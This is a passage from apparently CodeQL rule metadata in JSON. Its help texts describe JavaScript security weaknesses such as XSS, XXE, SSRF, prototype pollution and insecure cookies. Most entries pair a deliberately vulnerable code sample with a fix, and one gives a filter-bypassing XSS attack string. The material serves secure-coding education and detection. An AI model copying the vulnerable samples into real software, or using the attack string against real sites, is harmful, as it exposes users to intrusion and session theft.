    "help": "# Sensitive server cookie exposed to the client\nAuthentication cookies stored by a server can be accessed by a client if the `httpOnly` flag is not set.\n\nAn attacker that manages a cross-site scripting (XSS) attack can read the cookie and hijack the session.\n\n\n## Recommendation\nSet the `httpOnly` flag on all cookies that are not needed by the client.\n\n\n## Example\nThe following example stores an authentication token in a cookie that can be viewed by the client.\n\n\n```javascript\nconst http = require('http');\n\nconst server = http.createServer((req, res) => {\n    res.setHeader(\"Set-Cookie\", `authKey=${makeAuthkey()}`);\n    res.writeHead(200, { 'Content-Type': 'text/html' });\n    res.end('<h2>Hello world</h2>');\n});\n```\nTo force the cookie to be transmitted using SSL, set the `secure` attribute on the cookie.\n\n\n```javascript\nconst http = require('http');\n\nconst server = http.createServer((req, res) => {\n    res.setHeader(\"Set-Cookie\", `authKey=${makeAuthkey()}; secure; httpOnly`);\n    res.writeHead(200, { 'Content-Type': 'text/html' });\n    res.end('<h2>Hello world</h2>');\n});\n```\n\n## References\n* ExpressJS: [Use cookies securely](https://expressjs.com/en/advanced/best-practice-security.html#use-cookies-securely).\n* OWASP: [Set cookie flags appropriately](https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html#set-cookie-flags-appropriately).\n* Mozilla: [Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie).\n* Common Weakness Enumeration: [CWE-1004](https://cwe.mitre.org/data/definitions/1004.html).\n"
  },
  "js/predictable-token": {
    "name": "Predictable token",
    "description": "Tokens used for sensitive tasks, such as, password recovery, and email confirmation, should not use predictable values.",
    "kind": "path-problem",
    "precision": "medium",
    "problem.severity": "error",
    "security-severity": 5.0,
    "id": "js/predictable-token",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-340"
    ],
    "filename": "fe8b39d6-TokenBuiltFromUUID",
    "language": "javascript",
    "help": "# Predictable token\nGUIDs (often called UUIDs) are widely used in modern web applications. One common use for UUIDs is the generation of one-time-use tokens. These can used for password reset, and e-mail confirmation routines, for example.\n\nThere are five versions of UUIDs defined in RFC 4122. Out of the five, four are generated in a predictable manner. This means it is possible for someone to predict future UUIDs based on a sample generated by the target application.\n\nVersion four is the only UUID version expected to be randomly generated. Therefore, for situations where predictable tokens are not desired (e.g. password reset tokens), all other versions should be avoided.\n\n\n## Recommendation\nWhen using GUIDs/UUIDs for generating tokens that should not be predictable, use version four.\n\n\n## Example\nThis example shows a UUID v1 being used for a password reset routine.\n\n\n```javascript\nvar uuid = require('uuid');\n\nmodule.exports = function (app) {\n\n    app.use('/login', function (req, res) {\n\n        var username = req.body.username;\n        var password = req.body.password;\n\n        if (!username) {\n            res.status(400);\n            return;\n        }\n\n        if (!password) {\n            res.status(400);\n            return;\n        }\n\n        var newToken = {\n            userId: user._id,\n            token: uuid.v1(),\n            created: new Date(),\n        };\n\n        res.status(200).json({\n            token: newToken.token\n        });\n    });\n};\n```\n\n## References\n* UUID [RFC](https://datatracker.ietf.org/doc/html/rfc4122).\n* Daniel Thatcher *In GUID We Trust* [article](https://www.intruder.io/research/in-guid-we-trust).\n* UUID exploitation [tool](https://github.com/intruder-io/guidtool).\n* Common Weakness Enumeration: [CWE-340](https://cwe.mitre.org/data/definitions/340.html).\n"
  },
  "js/xxe-more-sources": {
    "name": "XML external entity expansion with additional heuristic sources",
    "description": "Parsing user input as an XML document with external entity expansion is vulnerable to XXE attacks.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.1,
    "precision": "high",
    "id": "js/xxe-more-sources",
    "tags": [
      "experimental",
      "security",
      "external/cwe/cwe-611",
      "external/cwe/cwe-827"
    ],
    "filename": "ee6f56b8-Xxe",
    "language": "javascript",
    "help": "# XML external entity expansion with additional heuristic sources\nParsing untrusted XML files with a weakly configured XML parser may lead to an XML External Entity (XXE) attack. This type of attack uses external entity references to access arbitrary files on a system, carry out denial-of-service (DoS) attacks, or server-side request forgery. Even when the result of parsing is not returned to the user, DoS attacks are still possible and out-of-band data retrieval techniques may allow attackers to steal sensitive data.\n\n\n## Recommendation\nThe easiest way to prevent XXE attacks is to disable external entity handling when parsing untrusted data. How this is done depends on the library being used. Note that some libraries, such as recent versions of `libxml`, disable entity expansion by default, so unless you have explicitly enabled entity expansion, no further action needs to be taken.\n\n\n## Example\nThe following example uses the `libxml` XML parser to parse a string `xmlSrc`. If that string is from an untrusted source, this code may be vulnerable to an XXE attack, since the parser is invoked with the `noent` option set to `true`:\n\n\n```javascript\nconst app = require(\"express\")(),\n  libxml = require(\"libxmljs\");\n\napp.post(\"upload\", (req, res) => {\n  let xmlSrc = req.body,\n    doc = libxml.parseXml(xmlSrc, { noent: true });\n});\n\n```\nTo guard against XXE attacks, the `noent` option should be omitted or set to `false`. This means that no entity expansion is undertaken at all, not even for standard internal entities such as `&amp;` or `&gt;`. If desired, these entities can be expanded in a separate step using utility functions provided by libraries such as [underscore](http://underscorejs.org/#unescape), [lodash](https://lodash.com/docs/4.17.15#unescape) or [he](https://github.com/mathiasbynens/he).\n\n\n```javascript\nconst app = require(\"express\")(),\n  libxml = require(\"libxmljs\");\n\napp.post(\"upload\", (req, res) => {\n  let xmlSrc = req.body,\n    doc = libxml.parseXml(xmlSrc);\n});\n\n```\n\n## References\n* OWASP: [XML External Entity (XXE) Processing](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing).\n* Timothy Morgen: [XML Schema, DTD, and Entity Attacks](https://research.nccgroup.com/2014/05/19/xml-schema-dtd-and-entity-attacks-a-compendium-of-known-techniques/).\n* Timur Yunusov, Alexey Osipov: [XML Out-Of-Band Data Retrieval](https://www.slideshare.net/qqlan/bh-ready-v4).\n* Common Weakness Enumeration: [CWE-611](https://cwe.mitre.org/data/definitions/611.html).\n* Common Weakness Enumeration: [CWE-827](https://cwe.mitre.org/data/definitions/827.html).\n"
  },
  "js/file-system-race": {
    "name": "Potential file system race condition",
    "description": "Separately checking the state of a file before operating on it may allow an attacker to modify the file between the two operations.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.7,
    "precision": "medium",
    "id": "js/file-system-race",
    "tags": [
      "security",
      "external/cwe/cwe-367"
    ],
    "filename": "551132d0-FileSystemRace",
    "language": "javascript",
    "help": "# Potential file system race condition\nOften it is necessary to check the state of a file before using it. These checks usually take a file name to be checked, and if the check returns positively, then the file is opened or otherwise operated upon.\n\nHowever, in the time between the check and the operation, the underlying file referenced by the file name could be changed by an attacker, causing unexpected behavior.\n\n\n## Recommendation\nUse file descriptors instead of file names whenever possible.\n\n\n## Example\nThe following example shows a case where the code checks whether a file inside the `/tmp/` folder exists, and if it doesn't, the file is written to that location.\n\n\n```javascript\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst filePath = path.join(os.tmpdir(), \"my-temp-file.txt\");\n\nif (!fs.existsSync(filePath)) {\n  fs.writeFileSync(filePath, \"Hello\", { mode: 0o600 });\n}\n\n```\nHowever, in a multi-user environment the file might be created by another user between the existence check and the write.\n\nThis can be avoided by using `fs.open` to get a file descriptor, and then use that file descriptor in the write operation.\n\n\n```javascript\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst filePath = path.join(os.tmpdir(), \"my-temp-file.txt\");\n\ntry {\n  const fd = fs.openSync(filePath, fs.O_CREAT | fs.O_EXCL | fs.O_RDWR, 0o600);\n\n  fs.writeFileSync(fd, \"Hello\");\n} catch (e) {\n  // file existed\n}\n\n```\n\n## References\n* Wikipedia: [Time-of-check to time-of-use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use).\n* The CERT Oracle Secure Coding Standard for C: [ FIO01-C. Be careful using functions that use file names for identification ](https://www.securecoding.cert.org/confluence/display/c/FIO01-C.+Be+careful+using+functions+that+use+file+names+for+identification).\n* NodeJS: [The FS module](https://nodejs.org/api/fs.html).\n* Common Weakness Enumeration: [CWE-367](https://cwe.mitre.org/data/definitions/367.html).\n"
  },
  "js/functionality-from-untrusted-domain": {
    "name": "Untrusted domain used in script or other content",
    "description": "Using a resource from an untrusted or compromised domain makes your code vulnerable to receiving malicious code.",
    "kind": "problem",
    "security-severity": 7.2,
    "problem.severity": "error",
    "id": "js/functionality-from-untrusted-domain",
    "precision": "high",
    "tags": [
      "security",
      "external/cwe/cwe-830"
    ],
    "filename": "3a4f8c7f-FunctionalityFromUntrustedDomain",
    "language": "javascript",
    "help": "# Untrusted domain used in script or other content\nContent Delivery Networks (CDNs) are used to deliver content to users quickly and efficiently. However, they can change hands or be operated by untrustworthy owners, risking the security of the sites that use them. Some CDN domains are operated by entities that have used CDNs to deliver malware, which this query identifies.\n\nFor example, `polyfill.io` was a popular JavaScript CDN, used to support new web browser standards on older browsers. In February 2024 the domain was sold, and in June 2024 it was publicised that the domain had been used to serve malicious scripts. It was taken down later in that month, leaving a window where sites that used the service could have been compromised. The same operator runs several other CDNs, undermining trust in those too.\n\nIncluding a resource from an untrusted source or using an untrusted channel may allow an attacker to include arbitrary code in the response. When including an external resource (for example, a `script` element) on a page, it is important to ensure that the received data is not malicious.\n\nEven when `https` is used, an untrustworthy operator might deliver malware.\n\nSee the \\[\\`CUSTOMIZING.md\\`\\](https://github.com/github/codeql/blob/main/javascript/ql/src/Security/CWE-830/CUSTOMIZING.md) file in the source code for this query for information on how to extend the list of untrusted domains used by this query.\n\n\n## Recommendation\nCarefully research the ownership of a Content Delivery Network (CDN) before using it in your application.\n\nIf you find code that originated from an untrusted domain in your application, you should review your logs to check for compromise.\n\nTo help mitigate the risk of including a script that could be compromised in the future, consider whether you need to use polyfill or another library at all. Modern browsers do not require a polyfill, and other popular libraries were made redundant by enhancements to HTML 5.\n\nIf you do need a polyfill service or library, move to using a CDN that you trust.\n\nWhen you use a `script` or `link` element, you should check for [subresource integrity (SRI)](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity), and pin to a hash of a version of the service that you can trust (for example, because you have audited it for security and unwanted features). A dynamic service cannot be easily used with SRI. Nevertheless, it is possible to list multiple acceptable SHA hashes in the `integrity` attribute, such as hashes for the content required for the major browsers used by your users.\n\nYou can also choose to self-host an uncompromised version of the service or library.\n\n\n## Example\nThe following example loads the Polyfill.io library from the `polyfill.io` CDN. This use was open to malicious scripts being served by the CDN.\n\n\n```html\n<html>\n    <head>\n        <title>Polyfill.io demo</title>\n        <script src=\"https://cdn.polyfill.io/v2/polyfill.min.js\" crossorigin=\"anonymous\"></script>\n    </head>\n    <body>\n        ...\n    </body>\n</html>\n```\nInstead, load the Polyfill library from a trusted CDN, as in the next example:\n\n\n```html\n<html>\n    <head>\n        <title>Polyfill demo - Cloudflare hosted with pinned version (but no integrity checking, since it is dynamically generated)</title>\n        <script src=\"https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?version=4.8.0\" crossorigin=\"anonymous\"></script>\n    </head>\n    <body>\n        ...\n    </body>\n</html>\n```\nIf you know which browsers are used by the majority of your users, you can list the hashes of the polyfills for those browsers:\n\n\n```html\n<html>\n    <head>\n        <title>Polyfill demo - Cloudflare hosted with pinned version (with integrity checking for a *very limited* browser set - just an example!)</title>\n        <script src=\"https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?version=4.8.0\" integrity=\"sha384-i0IGVuZBkKZqwXTD4CH4kcksIbFx7WKFMdxN8zUhLFHpLdELF0ym0jxa6UvLhW8/ sha384-3d4jRKquKl90C9aFG+eH4lPJmtbPHgACWHrp+VomFOxF8lzx2jxqeYkhpRg18UWC\" crossorigin=\"anonymous\"></script>\n    </head>\n    <body>\n        ...\n    </body>\n</html>\n```\n\n## References\n* Sansec: [Polyfill supply chain attack hits 100K+ sites](https://sansec.io/research/polyfill-supply-chain-attack)\n* Cloudflare: [Upgrade the web. Automatically. Delivers only the polyfills required by the user's web browser.](https://cdnjs.cloudflare.com/polyfill)\n* Fastly: [New options for Polyfill.io users](https://community.fastly.com/t/new-options-for-polyfill-io-users/2540)\n* Wikipedia: [Polyfill (programming)](https://en.wikipedia.org/wiki/Polyfill_(programming))\n* MDN Web Docs: [Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)\n* Common Weakness Enumeration: [CWE-830](https://cwe.mitre.org/data/definitions/830.html).\n"
  },
  "js/request-forgery": {
    "name": "Server-side request forgery",
    "description": "Making a network request with user-controlled data in the URL allows for request forgery attacks.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.1,
    "precision": "high",
    "id": "js/request-forgery",
    "tags": [
      "security",
      "external/cwe/cwe-918"
    ],
    "filename": "cd6c747e-RequestForgery",
    "language": "javascript",
    "help": "# Server-side request forgery\nDirectly incorporating user input in the URL of an outgoing HTTP request can enable a request forgery attack, in which the request is altered to target an unintended API endpoint or resource. If the server performing the request is connected to an internal network, this can give an attacker the means to bypass the network boundary and make requests against internal services. A forged request may perform an unintended action on behalf of the attacker, or cause information leak if redirected to an external server or if the request response is fed back to the user. It may also compromise the server making the request, if the request response is handled in an unsafe way.\n\n\n## Recommendation\nRestrict user inputs in the URL of an outgoing request, in particular:\n\n* Avoid user input in the hostname of the URL. Pick the hostname from an allow-list instead of constructing it directly from user input.\n* Take care when user input is part of the pathname of the URL. Restrict the input so that path traversal (\"`../`\") cannot be used to redirect the request to an unintended endpoint.\n\n## Example\nThe following example shows an HTTP request parameter being used directly in the URL of a request without validating the input, which facilitates an SSRF attack. The request `http.get(...)` is vulnerable since attackers can choose the value of `target` to be anything they want. For instance, the attacker can choose `\"internal.example.com/#\"` as the target, causing the URL used in the request to be `\"https://internal.example.com/#.example.com/data\"`.\n\nA request to `https://internal.example.com` may be problematic if that server is not meant to be directly accessible from the attacker's machine.\n\n\n```javascript\nimport http from 'http';\n\nconst server = http.createServer(function(req, res) {\n    const target = new URL(req.url, \"http://example.com\").searchParams.get(\"target\");\n\n    // BAD: `target` is controlled by the attacker\n    http.get('https://' + target + \".example.com/data/\", res => {\n        // process request response ...\n    });\n\n});\n\n```\nOne way to remedy the problem is to use the user input to select a known fixed string before performing the request:\n\n\n```javascript\nimport http from 'http';\n\nconst server = http.createServer(function(req, res) {\n    const target = new URL(req.url, \"http://example.com\").searchParams.get(\"target\");\n\n    let subdomain;\n    if (target === 'EU') {\n        subdomain = \"europe\"\n    } else {\n        subdomain = \"world\"\n    }\n\n    // GOOD: `subdomain` is controlled by the server\n    http.get('https://' + subdomain + \".example.com/data/\", res => {\n        // process request response ...\n    });\n\n});\n\n```\n\n## References\n* OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)\n* Common Weakness Enumeration: [CWE-918](https://cwe.mitre.org/data/definitions/918.html).\n"
  },
  "js/xss-more-sources": {
    "name": "Client-side cross-site scripting with additional heuristic sources",
    "description": "Writing user input directly to the DOM allows for a cross-site scripting vulnerability.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 6.1,
    "precision": "high",
    "id": "js/xss-more-sources",
    "tags": [
      "experimental",
      "security",
      "external/cwe/cwe-079",
      "external/cwe/cwe-116"
    ],
    "filename": "085b0bd8-Xss",
    "language": "javascript",
    "help": "# Client-side cross-site scripting with additional heuristic sources\nDirectly writing user input (for example, a URL query parameter) to a webpage without properly sanitizing the input first, allows for a cross-site scripting vulnerability.\n\nThis kind of vulnerability is also called *DOM-based* cross-site scripting, to distinguish it from other types of cross-site scripting.\n\n\n## Recommendation\nTo guard against cross-site scripting, consider using contextual output encoding/escaping before writing user input to the page, or one of the other solutions that are mentioned in the references.\n\n\n## Example\nThe following example shows part of the page URL being written directly to the document, leaving the website vulnerable to cross-site scripting.\n\n\n```javascript\nfunction setLanguageOptions() {\n    var href = document.location.href,\n        deflt = href.substring(href.indexOf(\"default=\")+8);\n    document.write(\"<OPTION value=1>\"+deflt+\"</OPTION>\");\n    document.write(\"<OPTION value=2>English</OPTION>\");\n}\n\n```\n\n## References\n* OWASP: [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).\n* OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n* OWASP [DOM Based XSS](https://www.owasp.org/index.php/DOM_Based_XSS).\n* OWASP [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).\n* Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  },
  "js/tainted-format-string-more-sources": {
    "name": "Use of externally-controlled format string with additional heuristic sources",
    "description": "Using external input in format strings can lead to garbled output.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.3,
    "precision": "high",
    "id": "js/tainted-format-string-more-sources",
    "tags": [
      "experimental",
      "security",
      "external/cwe/cwe-134"
    ],
    "filename": "730798a2-TaintedFormatString",
    "language": "javascript",
    "help": "# Use of externally-controlled format string with additional heuristic sources\nFunctions like the Node.js standard library function `util.format` accept a format string that is used to format the remaining arguments by providing inline format specifiers. If the format string contains unsanitized input from an untrusted source, then that string may contain unexpected format specifiers that cause garbled output.\n\n\n## Recommendation\nEither sanitize the input before including it in the format string, or use a `%s` specifier in the format string, and pass the untrusted data as corresponding argument.\n\n\n## Example\nThe following program snippet logs information about an unauthorized access attempt. The log message includes the user name, and the user's IP address is passed as an additional argument to `console.log` to be appended to the message:\n\n\n```javascript\nconst app = require(\"express\")();\n\napp.get(\"unauthorized\", function handler(req, res) {\n  let user = req.query.user;\n  let ip = req.connection.remoteAddress;\n  console.log(\"Unauthorized access attempt by \" + user, ip);\n});\n\n```\nHowever, if a malicious user provides `%d` as their user name, `console.log` will instead attempt to format the `ip` argument as a number. Since IP addresses are not valid numbers, the result of this conversion is `NaN`. The resulting log message will read \"Unauthorized access attempt by NaN\", missing all the information that it was trying to log in the first place.\n\nInstead, the user name should be included using the `%s` specifier:\n\n\n```javascript\nconst app = require(\"express\")();\n\napp.get(\"unauthorized\", function handler(req, res) {\n  let user = req.query.user;\n  let ip = req.connection.remoteAddress;\n  console.log(\"Unauthorized access attempt by %s\", user, ip);\n});\n\n```\n\n## References\n* Node.js Documentation: [util.format](https://nodejs.org/api/util.html#util_util_format_format_args).\n* Common Weakness Enumeration: [CWE-134](https://cwe.mitre.org/data/definitions/134.html).\n"
  },
  "js/remote-property-injection": {
    "name": "Remote property injection",
    "description": "Allowing writes to arbitrary properties of an object may lead to denial-of-service attacks.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "medium",
    "id": "js/remote-property-injection",
    "tags": [
      "security",
      "external/cwe/cwe-250",
      "external/cwe/cwe-400"
    ],
    "filename": "beefb534-RemotePropertyInjection",
    "language": "javascript",
    "help": "# Remote property injection\nDynamically computing object property names from untrusted input may have multiple undesired consequences. For example, if the property access is used as part of a write, an attacker may overwrite vital properties of objects, such as `__proto__`. This attack is known as *prototype pollution attack* and may serve as a vehicle for denial-of-service attacks. A similar attack vector, is to replace the `toString` property of an object with a primitive. Whenever `toString` is then called on that object, either explicitly or implicitly as part of a type coercion, an exception will be raised.\n\nMoreover, if the name of an HTTP header is user-controlled, an attacker may exploit this to overwrite security-critical headers such as `Access-Control-Allow-Origin` or `Content-Security-Policy`.\n\n\n## Recommendation\nThe most common case in which prototype pollution vulnerabilities arise is when JavaScript objects are used for implementing map data structures. This case should be avoided whenever possible by using the ECMAScript 2015 `Map` instead. When this is not possible, an alternative fix is to prepend untrusted input with a marker character such as `$`, before using it in properties accesses. In this way, the attacker does not have access to built-in properties which do not start with the chosen character.\n\nWhen using user input as part of a header name, a sanitization step should be performed on the input to ensure that the name does not clash with existing header names such as `Content-Security-Policy`.\n\n\n## Example\nIn the example below, the dynamically computed property `prop` is accessed on `myObj` using a user-controlled value.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = req.query.userControlled; // BAD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\nThis is not secure since an attacker may exploit this code to overwrite the property `__proto__` with an empty function. If this happens, the concatenation in the `console.log` argument will fail with a confusing message such as \"Function.prototype.toString is not generic\". If the application does not properly handle this error, this scenario may result in a serious denial-of-service attack. The fix is to prepend the user-controlled string with a marker character such as `$` which will prevent arbitrary property names from being overwritten.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = \"$\" + req.query.userControlled; // GOOD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\n\n## References\n* Prototype pollution attacks: [electron](https://github.com/electron/electron/pull/9287), [lodash](https://hackerone.com/reports/310443), [hoek](https://npmjs.com/advisories/566).\n* Penetration testing report: [ header name injection attack](http://seclists.org/pen-test/2009/Mar/67)\n* npm blog post: [ dangers of square bracket notation](https://github.com/nodesecurity/eslint-plugin-security/blob/3c7522ca1be800353513282867a1034c795d9eb4/docs/the-dangers-of-square-bracket-notation.md)\n* Common Weakness Enumeration: [CWE-250](https://cwe.mitre.org/data/definitions/250.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n"
  },
  "js/password-in-configuration-file": {
    "name": "Password in configuration file",
    "description": "Storing unencrypted passwords in configuration files is unsafe.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "medium",
    "id": "js/password-in-configuration-file",
    "tags": [
      "security",
      "external/cwe/cwe-256",
      "external/cwe/cwe-260",
      "external/cwe/cwe-313",
      "external/cwe/cwe-522"
    ],
    "filename": "45b185e8-PasswordInConfigurationFile",
    "language": "javascript",
    "help": "# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n"
  },
  "js/clear-text-cookie": {
    "name": "Clear text transmission of sensitive cookie",
    "description": "Sending sensitive information in a cookie without requring SSL encryption can expose the cookie to an attacker.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 5.0,
    "precision": "high",
    "id": "js/clear-text-cookie",
    "tags": [
      "security",
      "external/cwe/cwe-614",
      "external/cwe/cwe-311",
      "external/cwe/cwe-312",
      "external/cwe/cwe-319"
    ],
    "filename": "9a95b588-ClearTextCookie",
    "language": "javascript",
    "help": "# Clear text transmission of sensitive cookie\nCookies that are transmitted in clear text can be intercepted by an attacker. If sensitive cookies are intercepted, the attacker can read the cookie and use it to perform actions on the user's behalf.\n\n\n## Recommendation\nAlways transmit sensitive cookies using SSL by setting the `secure` attribute on the cookie.\n\n\n## Example\nThe following example stores an authentication token in a cookie that can be transmitted in clear text.\n\n\n```javascript\nconst http = require('http');\n\nconst server = http.createServer((req, res) => {\n    res.setHeader(\"Set-Cookie\", `authKey=${makeAuthkey()}`);\n    res.writeHead(200, { 'Content-Type': 'text/html' });\n    res.end('<h2>Hello world</h2>');\n});\n```\nTo force the cookie to be transmitted using SSL, set the `secure` attribute on the cookie.\n\n\n```javascript\nconst http = require('http');\n\nconst server = http.createServer((req, res) => {\n    res.setHeader(\"Set-Cookie\", `authKey=${makeAuthkey()}; secure; httpOnly`);\n    res.writeHead(200, { 'Content-Type': 'text/html' });\n    res.end('<h2>Hello world</h2>');\n});\n```\n\n## References\n* ExpressJS: [Use cookies securely](https://expressjs.com/en/advanced/best-practice-security.html#use-cookies-securely).\n* OWASP: [Set cookie flags appropriately](https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html#set-cookie-flags-appropriately).\n* Mozilla: [Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie).\n* Common Weakness Enumeration: [CWE-614](https://cwe.mitre.org/data/definitions/614.html).\n* Common Weakness Enumeration: [CWE-311](https://cwe.mitre.org/data/definitions/311.html).\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n* Common Weakness Enumeration: [CWE-319](https://cwe.mitre.org/data/definitions/319.html).\n"
  },
  "js/tainted-format-string": {
    "name": "Use of externally-controlled format string",
    "description": "Using external input in format strings can lead to garbled output.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.3,
    "precision": "high",
    "id": "js/tainted-format-string",
    "tags": [
      "security",
      "external/cwe/cwe-134"
    ],
    "filename": "8f938ce7-TaintedFormatString",
    "language": "javascript",
    "help": "# Use of externally-controlled format string\nFunctions like the Node.js standard library function `util.format` accept a format string that is used to format the remaining arguments by providing inline format specifiers. If the format string contains unsanitized input from an untrusted source, then that string may contain unexpected format specifiers that cause garbled output.\n\n\n## Recommendation\nEither sanitize the input before including it in the format string, or use a `%s` specifier in the format string, and pass the untrusted data as corresponding argument.\n\n\n## Example\nThe following program snippet logs information about an unauthorized access attempt. The log message includes the user name, and the user's IP address is passed as an additional argument to `console.log` to be appended to the message:\n\n\n```javascript\nconst app = require(\"express\")();\n\napp.get(\"unauthorized\", function handler(req, res) {\n  let user = req.query.user;\n  let ip = req.connection.remoteAddress;\n  console.log(\"Unauthorized access attempt by \" + user, ip);\n});\n\n```\nHowever, if a malicious user provides `%d` as their user name, `console.log` will instead attempt to format the `ip` argument as a number. Since IP addresses are not valid numbers, the result of this conversion is `NaN`. The resulting log message will read \"Unauthorized access attempt by NaN\", missing all the information that it was trying to log in the first place.\n\nInstead, the user name should be included using the `%s` specifier:\n\n\n```javascript\nconst app = require(\"express\")();\n\napp.get(\"unauthorized\", function handler(req, res) {\n  let user = req.query.user;\n  let ip = req.connection.remoteAddress;\n  console.log(\"Unauthorized access attempt by %s\", user, ip);\n});\n\n```\n\n## References\n* Node.js Documentation: [util.format](https://nodejs.org/api/util.html#util_util_format_format_args).\n* Common Weakness Enumeration: [CWE-134](https://cwe.mitre.org/data/definitions/134.html).\n"
  },
  "js/bad-tag-filter": {
    "name": "Bad HTML filtering regexp",
    "description": "Matching HTML tags using regular expressions is hard to do right, and can easily lead to security issues.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "high",
    "id": "js/bad-tag-filter",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-020",
      "external/cwe/cwe-080",
      "external/cwe/cwe-116",
      "external/cwe/cwe-184",
      "external/cwe/cwe-185",
      "external/cwe/cwe-186"
    ],
    "filename": "557f3ed7-BadTagFilter",
    "language": "javascript",
    "help": "# Bad HTML filtering regexp\nIt is possible to match some single HTML tags using regular expressions (parsing general HTML using regular expressions is impossible). However, if the regular expression is not written well it might be possible to circumvent it, which can lead to cross-site scripting or other security issues.\n\nSome of these mistakes are caused by browsers having very forgiving HTML parsers, and will often render invalid HTML containing syntax errors. Regular expressions that attempt to match HTML should also recognize tags containing such syntax errors.\n\n\n## Recommendation\nUse a well-tested sanitization or parser library if at all possible. These libraries are much more likely to handle corner cases correctly than a custom implementation.\n\n\n## Example\nThe following example attempts to filters out all `<script>` tags.\n\n\n```javascript\nfunction filterScript(html) {\n    var scriptRegex = /<script\\b[^>]*>([\\s\\S]*?)<\\/script>/gi;\n    var match;\n    while ((match = scriptRegex.exec(html)) !== null) {\n        html = html.replace(match[0], match[1]);\n    }\n    return html;\n}\n\n```\nThe above sanitizer does not filter out all `<script>` tags. Browsers will not only accept `</script>` as script end tags, but also tags such as `</script foo=\"bar\">` even though it is a parser error. This means that an attack string such as `<script>alert(1)</script foo=\"bar\">` will not be filtered by the function, and `alert(1)` will be executed by a browser if the string is rendered as HTML.\n\nOther corner cases include that HTML comments can end with `--!>`, and that HTML tag names can contain upper case characters.\n\n\n## References\n* Securitum: [The Curious Case of Copy &amp; Paste](https://research.securitum.com/the-curious-case-of-copy-paste/).\n* stackoverflow.com: [You can't parse \\[X\\]HTML with regex](https://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags#answer-1732454).\n* HTML Standard: [Comment end bang state](https://html.spec.whatwg.org/multipage/parsing.html#comment-end-bang-state).\n* stackoverflow.com: [Why aren't browsers strict about HTML?](https://stackoverflow.com/questions/25559999/why-arent-browsers-strict-about-html).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n* Common Weakness Enumeration: [CWE-80](https://cwe.mitre.org/data/definitions/80.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n* Common Weakness Enumeration: [CWE-184](https://cwe.mitre.org/data/definitions/184.html).\n* Common Weakness Enumeration: [CWE-185](https://cwe.mitre.org/data/definitions/185.html).\n* Common Weakness Enumeration: [CWE-186](https://cwe.mitre.org/data/definitions/186.html).\n"
  },
  "js/shell-command-constructed-from-input": {
    "name": "Unsafe shell command constructed from library input",
    "description": "Using externally controlled strings in a command line may allow a malicious user to change the meaning of the command.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 6.3,
    "precision": "high",
    "id": "js/shell-command-constructed-from-input",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-078",
      "external/cwe/cwe-088"
    ],
    "filename": "5ab6110a-UnsafeShellCommandConstruction",
    "language": "javascript",
